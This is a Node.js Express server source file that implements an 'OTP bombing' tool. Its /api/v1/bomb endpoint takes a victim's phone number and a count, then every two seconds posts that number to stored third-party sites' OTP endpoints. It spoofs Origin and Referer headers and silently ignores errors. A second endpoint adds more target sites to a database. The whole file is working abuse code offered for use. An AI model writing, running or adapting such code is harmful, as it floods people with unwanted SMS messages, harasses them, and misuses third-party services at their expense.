const express = require("express");
const { connectToMongoDb } = require("./service");
const URL = require("./Model/url");
const app = express();
const axios = require("axios");
require("dotenv").config();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
connectToMongoDb(process.env.MONGO_URI);

app.post("/api/v1/bomb", async (req, res) => {
    const { number, total } = req.body;
    let urls = await URL.find({}).limit(5);
    urls = [urls[3]];
    console.log(urls);
    const urlsLength = urls.length;
    let i = 0;
    const intervalId = setInterval(async () => {
        if (i < total) {
            const url = urls[i % urlsLength];
            const data = {
                [url.numberKey]: url.mobileNumber
                    ? (url.mobileNumber += String(number))
                    : String(number),
                ...url.otherFields,
            };
            try {
                await axios.post(`${url.url}`, data, {
                    headers: {
                        "Content-Type": "application/json",
                        "Access-Control-Allow-Origin": "*",
                        Origin: url.url,
                        Referer: url.url,
                    },
                });
            } catch (error) {}
            i++;
        } else {
            res.json({ message: "Execution Done" });
            clearInterval(intervalId);
        }
    }, 2000);
});

app.post("/api/add/otp-bombing/site", async (req, res) => {
    const { url, mobileNumber, numberKey } = req.body;
    const newUrl = new URL({
        url,
        mobileNumber,
        numberKey,
    });
    await newUrl.save();
    res.json({ message: "OTP Bombing Site Added" });
});

app.listen(3000, () => {
    console.log("Example app listening on port 3000!");
});
